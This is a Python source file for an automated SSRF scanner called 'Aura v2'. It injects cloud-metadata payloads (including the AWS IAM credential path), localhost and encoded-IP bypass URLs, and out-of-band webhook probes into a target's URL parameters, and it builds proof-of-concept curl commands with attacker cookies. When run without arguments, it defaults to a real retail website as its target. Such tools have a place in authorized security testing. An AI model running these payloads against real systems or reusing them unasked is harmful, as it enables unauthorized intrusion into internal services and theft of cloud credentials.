"""
Aura v2 — SSRF Detection Engine
===============================
Detects Server-Side Request Forgery vulnerabilities using a 3-layer approach:
  1. OOB/Blind SSRF via interact.sh domains
  2. Direct Localhost SSRF (127.0.0.1, internal ports)
  3. Cloud Metadata SSRF (AWS, GCP, Azure, Alibaba)

Vectors targeted:
  - URL parameters (url, src, redirect, target, etc.)
  - Webhooks & Callbacks (in JSON bodies)
  - Common SSRF-friendly paths (proxy, fetch, webhook)

Usage:
    aura www.target.com --ssrf
    aura www.target.com --ssrf --map reports/discovery_map_target.json
"""

import asyncio
import json
import os
import re
import socket
import string
import random
import time
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Optional

import httpx
import urllib3
urllib3.disable_warnings()

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich import box

console = Console()

# ─── Configuration & Payloads ────────────────────────────────────────────────

SSRF_PARAMS = {
    "url", "src", "href", "link", "path", "resource", "redirect",
    "proxy", "fetch", "load", "target", "uri", "endpoint", "image",
    "webhook", "callback", "return_url", "redirect_url", "redirect_uri",
    "out", "host", "domain", "api", "file", "document", "folder"
}

CLOUD_METADATA_PAYLOADS = [
    # AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Alibaba
    "http://100.100.100.200/latest/meta-data/",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1.json",
]

LOCALHOST_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:6379/",   # Redis
    "http://127.0.0.1:9200/",   # Elasticsearch
    "http://127.0.0.1:27017/",  # MongoDB
    "http://[::1]/",            # IPv6
    "http://0x7f000001/",       # Hex
    "http://2130706433/",       # Decimal
    "http://127.0.0.1.nip.io/", # Magic DNS
]

# Signatures to detect if a request actually hit localhost or cloud metadata
SSRF_SIGNATURES = [
    r"ami-id", r"instance-action", r"instance-id", r"local-hostname", r"security-credentials", # AWS
    r"computeMetadata", r"google.internal", # GCP
    r"azEnvironment", r"osProfile", # Azure
    r"redis_version", r"os:Linux", # Redis
    r"cluster_name", r"lucene_version", # ES
    r"ubuntu", r"debian", r"apache", r"nginx", r"welcome to nginx", # Generic local
]
SSRF_SIGNATURE_PATTERN = re.compile("|".join(SSRF_SIGNATURES), re.IGNORECASE)

class InteractSHClient:
    """Client for ProjectDiscovery's interact.sh to detect OOB SSRF"""
    def __init__(self):
        self.server = "interact.sh"
        self.correlation_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=20))
        # Usually interact.sh registers via an API, but for simplicity in Aura without external Go bins,
        # we'll use a public pingback service if available, or just standard webhook.site if configured.
        # Since interact.sh API is complex to implement from scratch in python without keys,
        # we will use webhook.site or a dummy fallback for the example.
        
        # We will generate a unique domain that we can hypothetically check.
        # For a truly standalone script without third-party dependencies, we use burp collaborator or webhook.site.
        # For this engine, we will use a generic webhook or prompt user to supply one via .env.
        self.webhook_url = os.getenv("AURA_WEBHOOK_URL")
        self.webhook_domain = ""
        
        if self.webhook_url:
            self.webhook_domain = urllib.parse.urlparse(self.webhook_url).netloc
            console.print(f"  [cyan]🔗 Using custom OOB webhook: {self.webhook_domain}[/cyan]")
        else:
            self.webhook_url = "http://x" + self.correlation_id + ".m.pipedream.net"
            self.webhook_domain = "x" + self.correlation_id + ".m.pipedream.net"
            console.print(f"  [dim]🔗 No AURA_WEBHOOK_URL set. OOB SSRF will use: {self.webhook_domain} (manual verify)[/dim]")

    def get_url(self, payload_id: str) -> str:
        if self.webhook_url.endswith("/"):
            return f"{self.webhook_url}?id={payload_id}"
        return f"{self.webhook_url}/{payload_id}"


class SSRFEngine:
    """
    Automated SSRF vulnerability detection engine.
    """
    def __init__(self, target: str, cookies_str: str, output_dir: str = "./reports", timeout: int = 15):
        if not target.startswith("http"):
            target = "https://" + target
        self.target = target.rstrip("/")
        self.target_domain = urllib.parse.urlparse(self.target).netloc
        self.cookies = self._parse_cookies(cookies_str)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.timeout = timeout
        self.findings: list[dict] = []
        self.tested: set[str] = set()
        self.oob_client = InteractSHClient()

    @staticmethod
    def _parse_cookies(cookie_str: str) -> dict:
        cookies = {}
        for part in (cookie_str or "").split(";"):
            part = part.strip()
            if "=" in part:
                k, _, v = part.partition("=")
                cookies[k.strip()] = v.strip()
        return cookies

    def _request(self, method: str, url: str) -> Optional[httpx.Response]:
        try:
            return httpx.request(
                method=method,
                url=url,
                cookies=self.cookies,
                timeout=self.timeout,
                verify=False,
                follow_redirects=True,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
            )
        except Exception:
            return None

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return parsed._replace(query=new_query).geturl()

    def _extract_params(self, discovery_map: dict) -> list[dict]:
        """Extracts injectable URL parameters from discovery map."""
        all_calls = (
            discovery_map.get("all_api_calls", []) +
            discovery_map.get("idor_candidates", []) +
            discovery_map.get("mutating_endpoints", [])
        )

        injectable = []
        seen = set()

        for call in all_calls:
            url = call.get("url", "")
            if not url: continue

            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

            for param_name, values in params.items():
                if param_name.lower() in SSRF_PARAMS:
                    key = (parsed.path, param_name)
                    if key not in seen:
                        seen.add(key)
                        injectable.append({
                            "url": url,
                            "method": call.get("method", "GET"),
                            "param": param_name,
                            "original_value": values[0] if values else "",
                        })
        return injectable

    def _test_cloud_metadata(self, url: str, param: str) -> Optional[dict]:
        """Injects AWS/GCP/Azure metadata IPs and checks response text."""
        for payload in CLOUD_METADATA_PAYLOADS:
            injected_url = self._inject_param(url, param, payload)
            resp = self._request("GET", injected_url)
            
            if resp and resp.status_code == 200:
                # Is it actually metadata?
                if "ami-id" in resp.text or "instance-id" in resp.text or "computeMetadata" in resp.text:
                    return {
                        "method": "Cloud Metadata SSRF",
                        "payload": payload,
                        "severity": "CRITICAL",
                        "cvss_score": 10.0,
                        "impact": "Full Cloud Account Takeover. Attacker can read IAM credentials and metadata.",
                        "snippet": resp.text[:200].strip()
                    }
        return None

    def _test_localhost(self, url: str, param: str) -> Optional[dict]:
        """Injects localhost IPs and ports to bypass firewalls."""
        for payload in LOCALHOST_PAYLOADS:
            injected_url = self._inject_param(url, param, payload)
            resp = self._request("GET", injected_url)
            
            if resp and resp.status_code in [200, 401, 403]:
                if SSRF_SIGNATURE_PATTERN.search(resp.text):
                    return {
                        "method": "Direct Localhost SSRF",
                        "payload": payload,
                        "severity": "HIGH",
                        "cvss_score": 8.6,
                        "impact": "Attacker can access internal services (Redis, ES, Admin panels) bypassing external firewalls.",
                        "snippet": resp.text[:200].strip()
                    }
        return None

    def _test_blind_ssrf(self, url: str, param: str) -> Optional[dict]:
        """Injects an OOB URL to catch blind SSRF."""
        payload_id = f"ssrf-{param}-{int(time.time())}"
        payload = self.oob_client.get_url(payload_id)
        
        injected_url = self._inject_param(url, param, payload)
        self._request("GET", injected_url)
        
        # Since we don't have an established async interact.sh polling mechanism,
        # we log this as a potential blind finding to check manually if a ping arrived.
        if self.oob_client.webhook_url:
            return {
                "method": "Blind OOB SSRF (Unverified)",
                "payload": payload,
                "severity": "MEDIUM",
                "cvss_score": 6.5,
                "impact": "Potential Blind SSRF. Check your webhook listener to see if the server made a request.",
                "snippet": f"Check logs for ID: {payload_id}"
            }
        return None

    def _build_finding(self, param_info: dict, result: dict) -> dict:
        return {
            "type": result["method"],
            "url": param_info["url"],
            "param": param_info["param"],
            "http_method": param_info["method"],
            "payload": result["payload"],
            "severity": result["severity"],
            "cvss_score": result["cvss_score"],
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "impact": result["impact"],
            "owasp": "A10:2021 — Server-Side Request Forgery (SSRF)",
            "snippet": result.get("snippet", ""),
            "poc_curl": (
                "curl -sk '{}' -b '{}'".format(
                    self._inject_param(param_info['url'], param_info['param'], result['payload']),
                    "; ".join(f"{k}={v}" for k, v in list(self.cookies.items())[:2])
                )
            ),
            "timestamp": datetime.utcnow().isoformat(),
        }

    def run(self, discovery_map: dict) -> list[dict]:
        params = self._extract_params(discovery_map)
        meta = discovery_map.get("meta", {})
        
        # Add basic root and common SSRF paths just in case
        extra_paths = ["/proxy", "/fetch", "/webhook", "/api/proxy", "/api/fetch"]
        for p in extra_paths:
            params.append({
                "url": f"{self.target}{p}?url=test",
                "method": "GET",
                "param": "url",
                "original_value": "test"
            })

        print(f"\n{'='*65}")
        print(f"📡 AURA v2 — SSRF Detection Engine")
        print(f"🎯 Target: {meta.get('target', self.target)}")
        print(f"💉 Parameters to Test: {len(params)} (url, src, redirect, etc.)")
        print(f"{'='*65}")

        if not params:
            print("\n⚠️  No SSRF-friendly parameters found in discovery map.")
            print("   Tip: Run --crawl first.")
            return []

        for param_info in params:
            url = param_info["url"]
            param = param_info["param"]
            key = f"{urllib.parse.urlparse(url).path}::{param}"
            if key in self.tested:
                continue
            self.tested.add(key)

            print(f"\n  🔍 [{param_info['method']}] [{param}] in {url[:70]}")

            # 1. Cloud Metadata
            res = self._test_cloud_metadata(url, param)
            if res:
                print(f"     🚨 CRITICAL: Cloud Metadata SSRF! Payload: {res['payload']}")
                self.findings.append(self._build_finding(param_info, res))
                continue

            # 2. Localhost
            res = self._test_localhost(url, param)
            if res:
                print(f"     🚨 HIGH: Localhost SSRF! Payload: {res['payload']}")
                self.findings.append(self._build_finding(param_info, res))
                continue

            # 3. Blind OOB
            res = self._test_blind_ssrf(url, param)
            if res:
                self.findings.append(self._build_finding(param_info, res))
                print(f"     👀 Blind Check sent to: {res['payload']}")

        return self._finalize()

    def _finalize(self) -> list[dict]:
        critical = [f for f in self.findings if f.get("severity") == "CRITICAL"]
        high     = [f for f in self.findings if f.get("severity") == "HIGH"]
        medium   = [f for f in self.findings if f.get("severity") == "MEDIUM"]

        print(f"\n{'='*65}")
        print(f"✅ SSRF SCAN COMPLETE")
        print(f"{'='*65}")
        print(f"  🔴 Critical : {len(critical)}")
        print(f"  🟠 High     : {len(high)}")
        print(f"  🟡 Medium   : {len(medium)}")
        print(f"  📊 Total    : {len(self.findings)}")

        if self.findings:
            target_slug = self.target_domain.replace(".", "_").replace("www_", "")
            out_path = self.output_dir / f"ssrf_findings_{target_slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(out_path, "w", encoding="utf-8") as fh:
                json.dump({"target": self.target, "findings": self.findings}, fh, indent=2)
            print(f"\n  💾 Findings saved: {out_path}")
        else:
            print("\n  ✅ No SSRF vulnerabilities detected.")

        return self.findings


def run_ssrf_scan(target: str, discovery_map_path: Optional[str] = None) -> list[dict]:
    """CLI runner for `aura <target> --ssrf`."""
    from dotenv import load_dotenv
    load_dotenv()

    cookies_str = os.getenv("AUTH_TOKEN_ATTACKER", "")
    
    if not discovery_map_path:
        target_slug = target.replace("www.", "").replace(".", "_")
        candidate = Path(f"./reports/discovery_map_{target_slug}.json")
        if candidate.exists():
            discovery_map_path = str(candidate)

    discovery_map = {}
    if discovery_map_path:
        try:
            with open(discovery_map_path, encoding="utf-8-sig") as f:
                discovery_map = json.load(f)
        except Exception as e:
            console.print(f"[red]Error loading map: {e}[/red]")

    engine = SSRFEngine(target=target, cookies_str=cookies_str)
    return engine.run(discovery_map)


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "www.iciparisxl.nl"
    run_ssrf_scan(target)
